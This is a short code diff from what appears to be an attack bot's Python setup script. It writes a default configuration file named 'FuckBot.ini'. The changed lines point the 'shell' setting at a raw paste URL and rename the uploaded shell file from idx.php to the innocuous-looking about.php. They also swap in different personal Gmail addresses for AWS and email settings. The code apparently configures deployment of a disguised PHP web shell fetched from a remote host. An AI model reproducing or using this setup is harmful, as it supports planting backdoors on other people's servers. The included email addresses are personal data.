@@ -100,12 +100,12 @@ if not os.path.exists("FuckBot.ini"):
     parser.add_section("scrapestack")
     parser.set("scrapestack", "scrapestack_key", "put_your_scrapestack_key_here")
     parser.add_section("shell")
-    parser.set("shell", "shell_url", "https://pastebin.com/raw/C5zzy6r4")
-    parser.set("shell", "shell_name", "idx.php")
+    parser.set("shell", "shell_url", "https://pst.innomi.net/paste/cuzk64k8xu5yzp88u7z33tjk/raw")
+    parser.set("shell", "shell_name", "about.php")
     parser.add_section("aws")
-    parser.set("aws", "email", "kinghamyourbae@gmail.com")
+    parser.set("aws", "email", "grayybsl@gmail.com")
     parser.add_section("email")
-    parser.set("email", "your_mail", "kinghamyourbae@gmail.com")
+    parser.set("email", "your_mail", "grayybsl@gmail.com")
     
     with open("FuckBot.ini", "w") as fp:
         parser.write(fp)
